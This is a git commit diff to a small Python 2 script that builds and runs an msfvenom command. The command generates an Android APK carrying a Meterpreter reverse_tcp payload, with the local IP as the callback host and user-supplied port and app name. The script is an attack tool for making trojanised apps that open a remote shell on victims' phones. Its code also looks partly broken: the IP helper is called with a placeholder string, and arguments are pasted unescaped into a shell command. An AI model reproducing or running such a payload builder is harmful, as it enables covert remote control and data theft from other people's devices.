f9d922d746a443b38664761cddbe5340778f6c1f
Grester43hck <grester43hck@gmail.com>
2016-08-14 11:30:38 +0200

    try

--- Python-1.py
+++ Python-1.py
@@ -1,5 +1,6 @@
 import socket
 import argparse
+from subprocess import Popen, PIPE, STDOUT
 
 def get_ip_address(args):
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -11,8 +12,7 @@ def launchProcess(command):
         stderr = STDOUT, shell = True)
     for line in p.stdout:
         print line.replace('\n', '')
-
-from subprocess import Popen, PIPE, STDOUT
+    return 0
 
 parser = argparse.ArgumentParser(description='Testing')
 #parser.add_argument('ip_remota', metavar='ipr', type=str, nargs='+',
@@ -25,7 +25,7 @@ args = parser.parse_args()
 
 print args.lp
 
-ipl = get_ip_address()
+ipl = get_ip_address("nanai")
 com = "msfvenom -p android/meterpreter/reverse_tcp LHOST="+ipl+" LPORT="+args.lp[0]+" R >"+args.app_name[0]+".apk"
 
 launchProcess(com)
